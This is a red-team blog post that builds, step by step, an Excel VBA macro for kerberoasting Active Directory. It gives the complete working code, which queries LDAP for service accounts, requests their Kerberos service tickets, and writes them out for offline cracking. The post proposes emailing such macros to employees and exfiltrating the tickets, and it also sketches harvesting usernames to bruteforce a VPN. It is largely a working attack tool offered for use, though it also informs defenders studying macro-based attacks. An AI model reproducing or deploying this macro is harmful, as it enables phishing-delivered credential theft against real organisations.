---
title: "Hacking in an epistolary way: implementing kerberoast in pure VBA"
date: 2020-10-31 00:00:00 +00:00
modified: 2020-10-31 00:00:00 +00:00
tags: [red team, research, X-C3LL]
description: Creating a macro for Excel in VBA to perform kerberoast attacks
image: 
---

Dear Fell**owl**ship, today's homily is about how a soul descended into the VBA hell and ended up creating juicy tools. Please, take a seat and listen to the story.


# Prayers at the foot of the Altar a.k.a. disclaimer
*Exposing yourself too much to VBA can be dangerous for your mind and your body. Please talk with your doctor before starting to code something in such crooked language.*

# Introduction
Using macros as the first stage of an attack is probably the Top One of tactics. Macros are usually used to deploy implants in order to infect computers, so that attackers can use these first boxes as pivot points and interact with the internal network. Recently a thought started haunting our heads: can we pwn something without dropping any binary or inject code, just launching attacks via Excels?. If time is not a constraint we can send different emails over time with attacks implemented in pure VBA (recon, bruteforcing, kerberoast/asreproast, ACLpwns, etc.).

For example, we can create a macro that interacts with a domain controller via LDAP to retrieve the userlist and exfiltrate the atributes `sAMAccountName` and `pwdLastSet`. We can turn the `pwdLastSet` to something like "Monthyear" (June2020, July2020...) and build a list of usernames and plausible passwords to bruteforce the VPN login. We would only need to send the macro via email to a bunch of employees and wait for the goodies.

Following this _hacking in an epistolary way_ idea, we started to create a macro for kerberoasting. We saw that the internet is full of macros that execute kerberoast attacks, but all of them either drop a binary, or inject a shellcode, or would just call powershell. We wanted to build something in pure VBA. So... let's go!

# Kerberoast
This kind of attack is really well explained in tons of articles over the internet, so we are not going to enter in such details here. As briefing we are going to quote the article [Kerberos (I): How does Kerberos work? – Theory](https://www.tarlogic.com/en/blog/how-kerberos-works/) from our friend [@zer1t0](https://twitter.com/zer1t0):

> Kerberoasting is a technique which takes advantage of TGS to crack the user accounts passwords offline. As seen above, TGS comes encrypted with service key, which is derived from service owner account NTLM hash. Usually the owners of services are the computers in which the services are being executed. However, the computer passwords are very complex, thus, it is not useful to try to crack those. This also happens in case of krbtgt account, therefore, TGT is not crackable neither. All the same, on some occasions the owner of service is a normal user account. In these cases it is more feasible to crack their passwords. Moreover, this sort of accounts normally have very juicy privileges. Additionally, to get a TGS for any service only a normal domain account is needed, due to Kerberos not perform authorization checks.


So we need to create a macro that solves two tasks: to list the SPNs whose authentication is related to a user account, and to ask for a TGS ticket for each one. To build our PoC we checked the source code of Mimikatz ([kuhl_m_kerberos.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos.c)) and this old example of how to ask for TGS tickets in Windows ([KList.c](https://github.com/Microsoft/Windows-classic-samples/blob/master/Samples/Win7Samples/security/authorization/klist/KList.c)).

We are going to need to call three functions from `ntsecapi`. First we need to establish an untrusted connection with the LSA server using [LsaConnectUntrusted](https://docs.microsoft.com/en-us/windows/win32/api/ntsecapi/nf-ntsecapi-lsaconnectuntrusted), then we get the authentication package identifier for Kerberos ([LsaLookupAuthenticationPackage](https://docs.microsoft.com/en-us/windows/win32/api/ntsecapi/nf-ntsecapi-lsalookupauthenticationpackage)), and finally we call [LsaCallAuthenticationPackage](https://docs.microsoft.com/en-us/windows/win32/api/ntsecapi/nf-ntsecapi-lsacallauthenticationpackage) to retrieve the target ticket.

We can check MSDN for information about what parameters those functions need. Of course VBA data types are wicked and can be a bit tricky, but with a bit of googling we can solve it:

```vb
Private Declare PtrSafe Function LsaConnectUntrusted Lib "SECUR32" (ByRef LsaHandle As LongPtr) As Long
Private Declare PtrSafe Function LsaLookupAuthenticationPackage Lib "SECUR32" (ByVal LsaHandle As LongPtr, ByRef PackageName As LSA_STRING, ByRef AuthenticationPackage As LongLong) As Long
Private Declare PtrSafe Function LsaCallAuthenticationPackage Lib "SECUR32" (ByVal LsaHandle As LongPtr, ByVal AuthenticationPackage As LongLong, ByVal ProtocolSubmitBuffer As LongPtr, ByVal SubmitBufferLength As Long, ProtocolReturnBuffer As Any, ByRef ReturnBufferLength As Long, ByRef ProtocolStatus As Long) As Long
```
As stated, types can be a bit tricky. In order to call **`LsaLookupAuthenticationPackage`** we need to use a **`LSA_STRING`** structure, defined as:

```c
typedef struct _LSA_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PCHAR  Buffer;
} LSA_STRING, *PLSA_STRING;
```

We don't have those types in VBA, so we need to fit the structure fields to types with the same size. This structure can be declared as:

```vb
Private Type LSA_STRING
    Length As Integer
    MaximumLength As Integer
    Buffer As String
End Type
```

So the first part of our subroutine to ask TGS tickets would be something like:

```vb
Sub askTGS(target As String)
    Dim Status As Long
    Dim pLogonHandle As LongPtr
    Dim Name As LSA_STRING
    Dim pPackageId As LongLong

    Status = LsaConnectUntrusted(pLogonHandle)
    If Status <> 0 Then
        MsgBox "Error, LsaConnectUntrusted failed!"
        Return
    End If

    With Name
        .Length = Len("Kerberos")
        .MaximumLength = Len("Kerberos") + 1
        .Buffer = "Kerberos"
    End With

    Status = LsaLookupAuthenticationPackage(pLogonHandle, Name, pPackageId)
    If Status <> 0 Then
        MsgBox "Error, LsaLookupAuthenticationPackage failed!"
        Return
    End If
```

To retrieve the ticket we need to call **`LsaCallAuthenticationPackage`** with a **`KERB_RETRIEVE_TKT_REQUEST`** struct as message. This struct is defined as:

```c
typedef struct _KERB_RETRIEVE_TKT_REQUEST {
    KERB_PROTOCOL_MESSAGE_TYPE MessageType;
    LUID                       LogonId;
    UNICODE_STRING             TargetName;
    ULONG                      TicketFlags;
    ULONG                      CacheOptions;
    LONG                       EncryptionType;
    SecHandle                  CredentialsHandle;
} KERB_RETRIEVE_TKT_REQUEST, *PKERB_RETRIEVE_TKT_REQUEST;
```

Also, we need to define the structure **`UNICODE_STRING`**, which is:
```c
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING
```

And **`SecHandle`**:

```c
typedef struct _SecHandle {
    ULONG_PTR       dwLower;
    ULONG_PTR       dwUpper;
} SecHandle, * PSecHandle
```

We can merge **`KERB_RETRIEVE_TKT_REQUEST`** and **`UNICODE_STRING`** structures to avoid issues, so our structures in VBA will be declared as:

```vb
Private Type SecHandle
    dwLower As LongPtr
    dwUpper As LongPtr
End Type

Private Type KERB_RETRIEVE_TKT_REQUEST
    MessageType As KERB_PROTOCOL_MESSAGE_TYPE
    LogonIdLower As Long
    LogonIdHigher As LongLong
    TargetNameLength As Integer
    TargetNameMaximumLength As Integer
    TargetNameBuffer As LongPtr
    TicketFlags As Long
    CacheOptions As Long
    EncryptionType As Long
    CredentialsHandle As SecHandle
End Type
```

Finally, **`KERB_PROTOCOL_MESSAGE_TYPE`** is just an enum:

```vb
Private Enum KERB_PROTOCOL_MESSAGE_TYPE
    KerbDebugRequestMessage = 0
    KerbQueryTicketCacheMessage
    KerbChangeMachinePasswordMessage
    KerbVerifyPacMessage
    KerbRetrieveTicketMessage
    KerbUpdateAddressesMessage
    KerbPurgeTicketCacheMessage
    KerbChangePasswordMessage
    KerbRetrieveEncodedTicketMessage
    KerbDecryptDataMessage
    KerbAddBindingCacheEntryMessage
    KerbSetPasswordMessage
    KerbSetPasswordExMessage
    KerbVerifyCredentialsMessage
    KerbQueryTicketCacheExMessage
    KerbPurgeTicketCacheExMessage
    KerbRefreshSmartcardCredentialsMessage
    KerbAddExtraCredentialsMessage
    KerbQuerySupplementalCredentialsMessage
    KerbTransferCredentialsMessage
    KerbQueryTicketCacheEx2Message
End Enum
```

Keep in mind that the field defined as **`TargetNameBuffer`** is the **`PWSTR Buffer`** from **`UNICODE_STRING`**, so here we are going to set a pointer to the string that contains the target SPN. The problem is: we do not know where in memory this information will be later, so we are setting this value to something random that will be overwritten with the pointer later on. Other values that we need to set are the encryption (RC4) and the CacheOptions:

```vb
'(...)
    With KerbRetrieveRequest
        .MessageType = KerbRetrieveEncodedTicketMessage
        .EncryptionType = 23 'KERB_ETYPE_RC4_HMAC_NT
        .CacheOptions = 8 'KERB_RETRIEVE_TICKET_AS_KERB_CRED
        .TargetNameLength = LenB(target)
        .TargetNameMaximumLength = LenB(target) + 2
        .TargetNameBuffer = 1337 'random value, we change it later
    End With
'(...)
```

To work with memory in VBA we use byte arrays. In order to add the target SPN string to the end of our structure, we need to create an array with the size of the struct, then get the pointer to the first element of this array (`VarPtr(yourArray(0))`), and use this address as destination (`RtlMoveMemory`). Then we convert this byte array to a string (`StrConv(array, vbUnicode)`) and concatenate the string with the target SPN. I ended with this weird method because VBA started to freak out in memory: I don't like how it is done, but it works.

```vb
'Copy the struct to an array and add the string with the target
Dim tmpBuffer() As Byte
Dim Dummy As String
ReDim tmpBuffer(0 To LenB(KerbRetrieveRequest) - 1)
Call CopyMemory(VarPtr(tmpBuffer(0)), VarPtr(KerbRetrieveRequest), LenB(KerbRetrieveRequest) - 1)
Dummy = StrConv(tmpBuffer, vbUnicode)
Dummy = Dummy & StrConv(target, vbUnicode)
```

At this point we have a string composed by our **`KERB_RETRIEVE_TKT_REQUEST`** + **`string with SPN`**, so we need to convert this to an array again, and get the memory address where our string is located at. Our structure has a size of 64 bytes, so the 65th byte is the first byte of our string: we can use **`VarPtr()`** again to get this value and set the **`TargetNameBuffer`** with this pointer later on:

```vb
'Get the buffer memory address
Dim fixedAddress As LongPtr
Dim tempToFix() As Byte
tempToFix = StrConv(Dummy, vbFromUnicode)
fixedAddress = VarPtr(tempToFix(64))
```

In order to call **`LsaCallAuthenticationPackage`**, our message buffer must be created in the heap, so we need to allocate memory and copy it:

```vb
'Alloc memory from heap and copy the struct
Dim heap As LongPtr
Dim mem As LongPtr
heap = GetProcessHeap()
mem = HeapAlloc(heap, 0, LenB(KerbRetrieveRequest) + LenB(target))
Call CopyMemory(mem, VarPtr(tempToFix(0)), LenB(KerbRetrieveRequest) + LenB(target))
```

And finally, we can call the function after overwriting the **`TargetNameBuffer`** field with the address extracted before:

```vb
'Fix the buffer address
fixedAddress = mem + 64
Call CopyMemory(mem + 24, VarPtr(fixedAddress), 8)
'Do the call
Status = LsaCallAuthenticationPackage(pLogonHandle, pPackageId, mem, LenB(KerbRetrieveRequest) + LenB(target), KerbRetrieveResponse, ResponseSize, SubStatus)
If Status <> 0 Then
    MsgBox "Error, LsaCallAuthenticationPackage failed!"
End If
```

If everything went smoothly now we have a buffer (**`KerbRetrieveResponse`**) that is a **`KERB_RETRIEVE_TKT_RESPONSE`** structure:

```c
typedef struct _KERB_RETRIEVE_TKT_RESPONSE {
    KERB_EXTERNAL_TICKET Ticket;
} KERB_RETRIEVE_TKT_RESPONSE, *PKERB_RETRIEVE_TKT_RESPONSE;
```

And **`KERB_EXTERNAL_TICKET`** is defined as:

```c
typedef struct _KERB_EXTERNAL_TICKET {
    PKERB_EXTERNAL_NAME ServiceName;
    PKERB_EXTERNAL_NAME TargetName;
    PKERB_EXTERNAL_NAME ClientName;
    UNICODE_STRING      DomainName;
    UNICODE_STRING      TargetDomainName;
    UNICODE_STRING      AltTargetDomainName;
    KERB_CRYPTO_KEY     SessionKey;
    ULONG               TicketFlags;
    ULONG               Flags;
    LARGE_INTEGER       KeyExpirationTime;
    LARGE_INTEGER       StartTime;
    LARGE_INTEGER       EndTime;
    LARGE_INTEGER       RenewUntil;
    LARGE_INTEGER       TimeSkew;
    ULONG               EncodedTicketSize;
    PUCHAR              EncodedTicket;
} KERB_EXTERNAL_TICKET, *PKERB_EXTERNAL_TICKET;
```

If we use [API Monitor](http://www.rohitab.com/downloads) to check this buffer in memory we get something like:
<figure>
<img src="/kerberoast-VBA-macro/memory_layout.jpg" alt="KERB_RETRIEVE_TKT_RESPONSE in memory">
<figcaption>
KERB_RETRIEVE_TKT_RESPONSE in memory
</figcaption>
</figure>

I highlighted a few pointers in green (the first pointers correspond to **`ServiceName`**, **`TargetName`**, **`ClientName`**, etc.), and the value of **`EncodedTicketSize`** in orange. After the **`EncodedTicketSize`**, the pointer (again in green) to the **`EncodedTicket`**. So to get our TGS ticket in KiRBi format (as Mimikatz does, for example) we need to extract the pointer to the encoded ticket (at offset 144) and read the amount of **`EncodedTicketSize`** bytes (this value is at offset 136):

```vb
'Ticket->EncodedTicketSize
Dim ticketSize As Integer
Call CopyMemory(VarPtr(ticketSize), VarPtr(Response(136)), 4)

'Ticket->EncodedTicket (address)
Dim encodedTicketAddress As LongPtr
Call CopyMemory(VarPtr(encodedTicketAddress), VarPtr(Response(144)), 8)

'Ticket->EncodedTicket (value)
Dim encodedTicket() As Byte
ReDim encodedTicket(0 To ticketSize)
Call CopyMemory(VarPtr(encodedTicket(0)), encodedTicketAddress, ticketSize)

'Save it
Dim fileName As String
fileName = Replace(target, "/", "_")
fileName = Replace(fileName, ":", "_")
MsgBox fileName
Open fileName & ".kirbi" For Binary Access Write As #1
    lWritePos = 1
    Put #1, lWritePos, encodedTicket
Close #1
```

Of course instead of saving them to disk, we should exfiltrate the ticket via HTTPs or any other method. Then we can convert the KiRBi ticket into a HashCat-friendly format using the [kirbi2hashcat.py](https://github.com/jarilaos/kirbi2hashcat/blob/master/kirbi2hashcat.py) script:

```bash
mothra@arcadia:/tmp|⇒  python kirbi2hashcat.py test.kirbi
$krb5tgs$23$2c4b4631e22d9e82823810dd51b11e17$1c1c0be320175b6486644311922fed8e3ee5a900112edbabe50b11d1a9b1f4609d30499616a8beb93071914f3eeade1e582878a1ad8c5574fbbc689569797aba9039da9f04ba3d91c3f12a307455d25e221fff21807d9d8d7e75492290be4922cf027e01aeae3e74eda64f6a258445b7547db94e9b5a153746a81b46d5b9a9d1c15794fb3cd6c488ac437ccb6a2612edcda95a2474854c73413024363c7dc40f3938b6ea988e246847fab0ed19433617870c05555dcee9b335f34774098f66a022437b75e22a787c9285276cd68a173f12fa0fbb2c41dafbf30e960f7404daee3b33d188a567e89f381e54936dfae1e3da74c6c50315308fa5dcb5af4e1e1ac9b2df5385cd8755365675c3aa8126ad62b24d5738c7ab665529c36aa09edc8a9935949142ccb75ade84596cf973700590d51e449eafb86a7b5149b89cb1232ac7823145c857d0762cbaf9c8a175e0783becd0c3f12dbf1ce02bca6d18e0d6a42949f5ac9a2442a94b1176ad3da71884be36da506c5e0aa2faf503c2ac5197b75ab1bce9f55abfbb8b374cfeacebac5a3d4ce3d01c23ce62312d5906846ea0b47d74b740dd5a1eac1451f599c6a0b6827bbe2a434a93646cb6990133392508b4e4650f635ae214b47cc1e7e135bd4d6ceaa188a61abd3dcbb5355a7fb48d6041bb6ff2c19b2a38fd2ec001e49794c61b0162393a94ba33da8d06df500cb39965ace726f542aacf2715f24c3a22e8e82c50f3b36f4ebb168c46f524c2c142521dca1e597e316fbf7ec1b7cb8810e63f39062d8369cf44e4b085bb1c85b7813c771644eaf7dfc7bce47238d77a5254edf5b179a4b34c1e567bb46aea4f965539f4e87425ceb17badcbd079dfc01d2a99270476592c4f4ea2718e3a55f6d8f61688b40669d0a13a3c3937feabc54a11e038e4c5a336273fd4601b5853d1e5df0d9a945cc2dbf2500c6f7bfc3099d386b9d7078b0f5850be93c4e2e220fbee3b19fdf3f9e18148495f409eb1b94fb43898bcdf512e32e4689d6e7414d2e51a8a605e5db0ca79f8dc5b0a34e3969dd5cca607aa0d63bc0146df647ae6126375a7723f1439401f1646f1be6c6cf98c27ab6bf3f3e4d571e8670288be55d11f5530aafff5fdecd108542ea78dfc1427e46761176dc5923418114164502d2981c03e7d3632ebb308d8f5e5ae258a7b545d95d25ba85139de8acafe20814e6074d1ed4528dd0ae8e69bf5dc18248a7ccb111bbcc13fa91d7eae0d5d688121d9fae6a574e0154dedeb3049e5f6c1c458950b3000e3174aec2d750cfc08ac8f29818b504e89feec8e68d2dc82a0211816ebe05c22c990692ba971bda7f4900262701873532c611a49b8e85c7a2fb4ab0ae79ca579e14a4a7fb3829a730b0e8e19d7e97a1ba05c17f9baafa52ca702e31bb7874cfa0db0af1452185987fbc991e333870268eb3cdf78008570f7f65ae4db99cfc10874f5c5c036af163ffe5ca35231904933b661b482bdcb04a75dcd626b3ce75b257df36b06589cae1ad73539f5de1f88e8b329e0999f56977ad9ef85a5d8dff00c89d121565ae720a3f4b458f84f46418dbe67f06600a600bb33d469cadd61061ca6ee1a6b4e0a011bb74b5c73d4361ebf2391b6fc9bf8a36ae63bb67a6dd5ebabc4d1
```

Now we have a way to request TGS tickets for SPNs, but how can we get our targets? We can use LDAP queries. I adapted the code from [this post](https://www.remkoweijnen.nl/blog/2007/11/01/query-active-directory-from-excel/) to perform a query with the filter `(&(samAccountType=805306368)(servicePrincipalName=*))`.

---

Our final code is:

```vb
Private Declare PtrSafe Function LsaConnectUntrusted Lib "SECUR32" (ByRef LsaHandle As LongPtr) As Long
Private Declare PtrSafe Function LsaLookupAuthenticationPackage Lib "SECUR32" (ByVal LsaHandle As LongPtr, ByRef PackageName As LSA_STRING, ByRef AuthenticationPackage As LongLong) As Long
Private Declare PtrSafe Function LsaCallAuthenticationPackage Lib "SECUR32" (ByVal LsaHandle As LongPtr, ByVal AuthenticationPackage As LongLong, ByVal ProtocolSubmitBuffer As LongPtr, ByVal SubmitBufferLength As Long, ProtocolReturnBuffer As Any, ByRef ReturnBufferLength As Long, ByRef ProtocolStatus As Long) As Long
Private Declare PtrSafe Sub CopyMemory Lib "KERNEL32" Alias "RtlMoveMemory" (ByVal Destination As LongPtr, ByVal Source As LongPtr, ByVal Length As Long)
Private Declare PtrSafe Function GetProcessHeap Lib "KERNEL32" () As LongPtr
Private Declare PtrSafe Function HeapAlloc Lib "KERNEL32" (ByVal hHeap As LongPtr, ByVal dwFlags As Long, ByVal dwBytes As LongLong) As LongPtr
Private Declare PtrSafe Function HeapFree Lib "KERNEL32" (ByVal hHeap As LongPtr, ByVal dwFlags As Long, lpMem As Any) As Long

Private Type LSA_STRING
    Length As Integer
    MaximumLength As Integer
    Buffer As String
End Type
Private Enum KERB_PROTOCOL_MESSAGE_TYPE
    KerbDebugRequestMessage = 0
    KerbQueryTicketCacheMessage
    KerbChangeMachinePasswordMessage
    KerbVerifyPacMessage
    KerbRetrieveTicketMessage
    KerbUpdateAddressesMessage
    KerbPurgeTicketCacheMessage
    KerbChangePasswordMessage
    KerbRetrieveEncodedTicketMessage
    KerbDecryptDataMessage
    KerbAddBindingCacheEntryMessage
    KerbSetPasswordMessage
    KerbSetPasswordExMessage
    KerbVerifyCredentialsMessage
    KerbQueryTicketCacheExMessage
    KerbPurgeTicketCacheExMessage
    KerbRefreshSmartcardCredentialsMessage
    KerbAddExtraCredentialsMessage
    KerbQuerySupplementalCredentialsMessage
    KerbTransferCredentialsMessage
    KerbQueryTicketCacheEx2Message
End Enum
Private Type SecHandle
    dwLower As LongPtr
    dwUpper As LongPtr
End Type
Private Type KERB_RETRIEVE_TKT_REQUEST
    MessageType As KERB_PROTOCOL_MESSAGE_TYPE
    LogonIdLower As Long
    LogonIdHigher As LongLong
    TargetNameLength As Integer
    TargetNameMaximumLength As Integer
    TargetNameBuffer As LongPtr
    TicketFlags As Long
    CacheOptions As Long
    EncryptionType As Long
    CredentialsHandle As SecHandle
End Type

Sub askTGS(target As String)
    Dim Status As Long
    Dim SubStatus As Long
    Dim pLogonHandle As LongPtr
    Dim Name As LSA_STRING
    Dim pPackageId As LongLong
    Dim KerbRetrieveRequest As KERB_RETRIEVE_TKT_REQUEST
    Dim KerbRetrieveResponse As LongPtr
    Dim ResponseSize As Long

    Status = LsaConnectUntrusted(pLogonHandle)
    If Status <> 0 Then
        MsgBox "Error, LsaConnectUntrusted failed!"
        Return
    End If

    With Name
        .Length = Len("Kerberos")
        .MaximumLength = Len("Kerberos") + 1
        .Buffer = "Kerberos"
    End With

    Status = LsaLookupAuthenticationPackage(pLogonHandle, Name, pPackageId)
    If Status <> 0 Then
        MsgBox "Error, LsaLookupAuthenticationPackage failed!"
        Return
    End If

    With KerbRetrieveRequest
        .MessageType = KerbRetrieveEncodedTicketMessage
        .EncryptionType = 23 'KERB_ETYPE_RC4_HMAC_NT
        .CacheOptions = 8 'KERB_RETRIEVE_TICKET_AS_KERB_CRED
        .TargetNameLength = LenB(target)
        .TargetNameMaximumLength = LenB(target) + 2
        .TargetNameBuffer = 1337 'random value, we change it later
    End With

    'Copy the struct to an array and add the string with the target
    Dim tmpBuffer() As Byte
    Dim Dummy As String
    ReDim tmpBuffer(0 To LenB(KerbRetrieveRequest) - 1)
    Call CopyMemory(VarPtr(tmpBuffer(0)), VarPtr(KerbRetrieveRequest), LenB(KerbRetrieveRequest) - 1)
    Dummy = StrConv(tmpBuffer, vbUnicode)
    Dummy = Dummy & StrConv(target, vbUnicode)

    'Get the buffer memory address
    Dim fixedAddress As LongPtr
    Dim tempToFix() As Byte
    tempToFix = StrConv(Dummy, vbFromUnicode)
    fixedAddress = VarPtr(tempToFix(64))

    'Alloc memory from heap and copy the struct
    Dim heap As LongPtr
    Dim mem As LongPtr
    heap = GetProcessHeap()
    mem = HeapAlloc(heap, 0, LenB(KerbRetrieveRequest) + LenB(target))
    Call CopyMemory(mem, VarPtr(tempToFix(0)), LenB(KerbRetrieveRequest) + LenB(target))

    'Fix the buffer address
    fixedAddress = mem + 64
    Call CopyMemory(mem + 24, VarPtr(fixedAddress), 8)

    'Do the call
    Status = LsaCallAuthenticationPackage(pLogonHandle, pPackageId, mem, LenB(KerbRetrieveRequest) + LenB(target), KerbRetrieveResponse, ResponseSize, SubStatus)
    If Status <> 0 Then
        MsgBox "Error, LsaCallAuthenticationPackage failed!"
    End If

    'Copy KERB_RETRIEVE_TKT_RESPONSE structure to an array
    Dim Response() As Byte
    Dim Data As String
    ReDim Response(0 To ResponseSize)
    Call CopyMemory(VarPtr(Response(0)), KerbRetrieveResponse, ResponseSize)

    'Ticket->EncodedTicketSize
    Dim ticketSize As Integer
    Call CopyMemory(VarPtr(ticketSize), VarPtr(Response(136)), 4)

    'Ticket->EncodedTicket (address)
    Dim encodedTicketAddress As LongPtr
    Call CopyMemory(VarPtr(encodedTicketAddress), VarPtr(Response(144)), 8)

    'Ticket->EncodedTicket (value)
    Dim encodedTicket() As Byte
    ReDim encodedTicket(0 To ticketSize)
    Call CopyMemory(VarPtr(encodedTicket(0)), encodedTicketAddress, ticketSize)

    'Save it (change it to send the ticket directly to your endpoint)
    Dim fileName As String
    fileName = Replace(target, "/", "_")
    fileName = Replace(fileName, ":", "_")
    MsgBox fileName
    Open fileName & ".kirbi" For Binary Access Write As #1
        lWritePos = 1
        Put #1, lWritePos, encodedTicket
    Close #1

End Sub
'Helper
Public Function toStr(pVar_In As Variant) As String
    On Error Resume Next
    toStr = CStr(pVar_In)
End Function

Sub kerberoast() 'https://www.remkoweijnen.nl/blog/2007/11/01/query-active-directory-from-excel/
    'Get the domain string ("dc=domain, dc=local")
    Dim strDomain As String
    strDomain = GetObject("LDAP://rootDSE").Get("defaultNamingContext")

    'ADODB Connection to AD
    Dim objConnection As Object
    Set objConnection = CreateObject("ADODB.Connection")
    objConnection.Open "Provider=ADsDSOObject;"

    'Connection
    Dim objCommand As ADODB.Command
    Set objCommand = CreateObject("ADODB.Command")
    objCommand.ActiveConnection = objConnection

    'Search the AD recursively, starting at root of the domain
    objCommand.CommandText = _
        "<LDAP://" & strDomain & ">;(&(samAccountType=805306368)(servicePrincipalName=*));,servicePrincipalName;subtree"
    Dim objRecordSet As ADODB.Recordset
    Set objRecordSet = objCommand.Execute

    Dim i As Long

    If objRecordSet.EOF And objRecordSet.BOF Then
    Else
        Do While Not objRecordSet.EOF
            For i = 0 To objRecordSet.Fields.Count - 1
                askTGS (toStr(objRecordSet!servicePrincipalName(0)))
            Next i
            objRecordSet.MoveNext
        Loop
    End If

    'Close connection
    objConnection.Close

    'Cleanup
    Set objRecordSet = Nothing
    Set objCommand = Nothing
    Set objConnection = Nothing
End Sub
```

# EoF

The VBA is dark and full of terrors, so please do not walk this path alone.

We hope you enjoyed this reading! Feel free to give us feedback at our twitter [@AdeptsOf0xCC](https://twitter.com/AdeptsOf0xCC).

